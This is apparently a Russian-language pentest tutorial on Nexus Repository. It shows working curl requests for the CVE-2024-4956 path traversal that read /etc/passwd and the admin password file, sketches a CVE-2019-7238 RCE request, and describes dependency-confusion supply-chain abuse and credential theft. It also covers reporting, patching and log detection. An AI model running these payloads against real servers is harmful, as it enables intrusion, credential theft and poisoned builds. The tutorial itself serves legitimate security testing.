## Вопрос, с которого всё начинается

Внутри сети стоит Nexus Repository — хранилище артефактов, куда CI-пайплайны кладут собранные пакеты, а сборки забирают зависимости. Казалось бы, «просто склад». Но на складе лежат jar-архивы с кодом, npm-пакеты, docker-образы — и через Nexus часто ходят креды. В 2024 году в нём нашли path traversal (CVE-2024-4956), читающий любые файлы. Разберём.

## Что такое Nexus Repository

**Nexus Repository** (Sonatype) — менеджер артефактов. Он проксирует внешние репозитории (Maven Central, npm) и хранит собственные. Команды используют его как приватный registry. Управление — через UI и REST API на `/service/rest/`.

Почему он ценен для атакующего: (1) через него ходят зависимости — можно подсунуть свой пакет (supply-chain); (2) он хранит **настройки** с кредами к внешним репозиториям; (3) у него есть CVE, дающие чтение файлов и RCE.

## Наш пример: Nexus 3.68.0

Цель — `http://nexus.target.example:8081`. Определяем версию:

```
$ curl -s http://nexus.target.example:8081/service/rest/v1/status/check
{"healthy":true,"version":"3.68.0"}
```

Версия **3.68.0** — попадает в CVE-2024-4956 (уязвимы все версии до 3.68.1). Отлично.

## Шаг 1: проверить анонимный доступ

Прежде чем эксплуатировать, посмотри, что открыто без логина:

```
$ curl -s http://nexus.target.example:8081/service/rest/v1/repositories | head -c 300
[{"name":"maven-central","format":"maven2","type":"proxy"},{"name":"npm-internal","format":"npm","type":"hosted"}]
```

Список репозиториев виден анонимно. Значит, можно читать артефакты и, возможно, искать секреты в них.

## Шаг 2: path traversal (CVE-2024-4956)

Уязвимость — в обработчике `/repository/`: обход пути через `%2e%2e%2f` позволяет читать файлы вне каталога репозитория. Проверяем неразрушающе:

```
$ curl -s 'http://nexus.target.example:8081/repository/..%2f..%2f..%2f..%2f..%2fetc/passwd' | head -3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...
```

Traversal работает. Теперь целимся в файлы Nexus:

```
$ curl -s 'http://nexus.target.example:8081/repository/..%2f..%2f..%2f..%2f..%2fnexus-data/admin.password'
a1b2c3d4-...-initial-admin-password
```

`admin.password` — начальный пароль админа (в новых версиях он хранится в `nexus-data`). С ним входим админом. Также можно прочитать `nexus-data/etc/nexus.properties` и настройки репозиториев с кредами.

## Шаг 3: CVE-2019-7238 — RCE через EL

В старых версиях Nexus (3.x до 3.17.0) была RCE через **инъекцию выражения** (EL) в API проверки компонентов. Атакующий с правом создания репозитория мог подсунуть выражение, которое выполнялось сервером. Это уже полный RCE:

```
POST /service/extdirect
{"action":"coreui_Component","method":"previewAssets","data":[{"filter":[... "expression":"... Java code ..."}]}
```

Если версия старая — проверь. Если новая — сосредоточься на traversal.

## Шаг 4: разбор артефактов

Даже без RCE Nexus ценен содержимым. В приватных репозиториях лежат jar/npm-пакеты с кодом компании. Их можно скачать и проанализировать на секреты: захардкоженные пароли, ключи, внутренние адреса. Плюс в настройках репозиториев — креды к внешним прокси.

## Шаг 5: supply-chain через Nexus

Если у тебя есть право **загружать** в hosted-репозиторий, ты можешь подсунуть свой пакет, который заберёт чужой пайплайн. Это классический dependency confusion: внутреннее имя пакета, а версия выше — твоя. Так артефактный склад превращается в вектор supply-chain.

## Шаг 6: пост-эксплуатация

Из Nexus достают: креды к внешним репозиториям, токены, содержимое пакетов. Через прокси-репозитории видно, какие зависимости использует компания, — это карта технологий. А через подменённый артефакт — путь в сборки.

## Что мы теперь знаем

- Nexus — менеджер артефактов с REST API и CVE.
- CVE-2024-4956 — path traversal, читает любые файлы (включая `admin.password`).
- CVE-2019-7238 — RCE через EL в старых версиях.
- Анонимный доступ отдаёт репозитории и артефакты.
- Nexus — и цель, и вектор supply-chain.

## Разбираем, почему traversal в репозитории так опасен

На первый взгляд path traversal, читающий `/etc/passwd`, кажется «низкоуровневым» — ну что там, список пользователей. Но в контексте Nexus он даёт гораздо больше. Каталог `nexus-data` содержит: `admin.password` (пароль админа), `etc/nexus.properties`, настройки репозиториев с кредами к внешним системам, а иногда — ключи шифрования. То есть traversal превращается в **полный доступ к продукту** и к кредам, которые он хранит.

Второй момент: Nexus часто запущен в Docker, и путь `..%2f` ведёт не только по диску контейнера, но и к смонтированным томам — например, к хостовому каталогу с данными. А если в контейнере есть доступ к Docker socket (частая ошибка), traversal может привести к контролю над хостом.

## Шаг 7: как найти версию без API

Если `/service/rest/v1/status` закрыт, версию снимают по статике: Nexus отдаёт `/static/rapture/...` и метаданные сборки в HTML. Также помогает `nuclei -tags nexus` — шаблоны проверяют CVE-2024-4956 неразрушающе, читая безобидный файл. Комбинация статики и шаблона даёт версию и подтверждение без изменения состояния.

## Шаг 8: что писать в отчёте

Отчёт фиксирует: версию Nexus; CVE-2024-4956 (или 2019-7238); доказательство traversal (чтение `/etc/passwd`); **что ещё прочитано** (admin.password, настройки с кредами); импакт (доступ к артефактам и кредам, supply-chain); рекомендацию (патч до 3.68.1+, ротация кред, аудит артефактов).

## Ошибки и антипаттерны

Первая — читать `/etc/shadow` или что-то заведомо чувствительное: достаточно `/etc/passwd` и `admin.password`. Вторая — выкачивать все артефакты: это гигабайты и заметно. Третья — забыть проверить, есть ли право загрузки: даже без RCE оно даёт supply-chain.

## Практический чек-лист по Nexus

Порядок действий. Обнаружение: порт 8081, страница Nexus, `/service/rest/v1/status`. Версия: `/service/rest/v1/status/check` или статика. Проверка анонимного доступа: `/service/rest/v1/repositories`. Выбор CVE: 3.x до 3.68.1 — CVE-2024-4956 (traversal), до 3.17.0 — CVE-2019-7238 (RCE). Проверка traversal: чтение `/etc/passwd`. Доказательство: чтение `nexus-data/admin.password`. Пост-эксплуатация: настройки репозиториев с кредами, содержимое артефактов. Отчёт: версия, CVE, доказательство, импакт, рекомендация.

## Сравнение Nexus и Artifactory

| Продукт | API | Классическая CVE | Порт |
|---|---|---|---|
| Nexus | `/service/rest/` | CVE-2024-4956 traversal | 8081 |
| Artifactory | `/artifactory/api/` | CVE-2019-9733 auth bypass | 8082 |

Оба — менеджеры артефактов, оба страдают от анонимного доступа и содержат секреты. Отличие в эндпоинтах и CVE. Определяй продукт по пути API до атаки.

## Разбор реального сценария

Представь внутренний пентест. Ты нашёл Nexus 3.68.0 на 8081. Проверяешь анонимный доступ — репозитории видны. Через traversal читаешь `/etc/passwd` (доказательство), затем `nexus-data/admin.password`. С паролем входишь админом и смотришь настройки репозиториев: там креды к внешнему Maven-прокси и к внутреннему S3. Ты фиксируешь: одна traversal-уязвимость дала админа Nexus и креды к трём системам. В отчёте это high: не «чтение файла», а «компрометация склада артефактов с кредами». Дальше — только чтение, никаких изменений.

## Итог по Nexus

Nexus — недооценённая цель: он выглядит как «склад пакетов», но хранит креды, исходники и образы, а его traversal-баг читает файлы с паролем админа. Порядок работы: версия → анонимный доступ → traversal → admin.password → креды. Ключевой вывод для пентеста: артефактный склад — это узел с секретами, а не второстепенный сервис.

## На что смотреть в логах Nexus

При защите Nexus логи показывают запросы к `/repository/` с `%2e%2e` — это признак traversal. Также стоит следить за скачиванием `admin.password` и необычными обращениями к `/service/rest/` без сессии. Для пентеста эти же индикаторы подсказывают, что твои действия заметны, — поэтому делай минимум запросов.
